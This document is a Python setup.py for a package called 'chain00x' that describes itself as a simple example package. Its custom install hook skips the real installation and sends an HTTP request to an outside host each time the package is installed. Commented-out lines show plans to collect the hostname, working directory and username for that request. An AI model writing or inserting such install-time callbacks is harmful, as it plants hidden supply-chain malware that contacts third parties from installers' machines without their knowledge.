from setuptools import find_packages, setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        # install.run(self)
        # hostname=socket.gethostname()
        # cwd = os.getcwd()
        # username = getpass.getuser()
        # ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://py.chain2.eyes.sh/")

setup(
    name='chain00x',
    version='1.0',
    packages=find_packages(),
    description='A simple example package',
    long_description=open('README.md').read(),
    # python3，readme文件中文报错
    # long_description=open('README.md', encoding='utf-8').read(),
    long_description_content_type='text/markdown',
    url='http://github.com/yourusername/my_package',
    author='Your Name',
    author_email='your.email@example.com',
    license='MIT',
    install_requires=[
        # 依赖列表
    ],
    classifiers=[
        # 分类信息
    ],
    cmdclass={'install': CustomInstall}
)
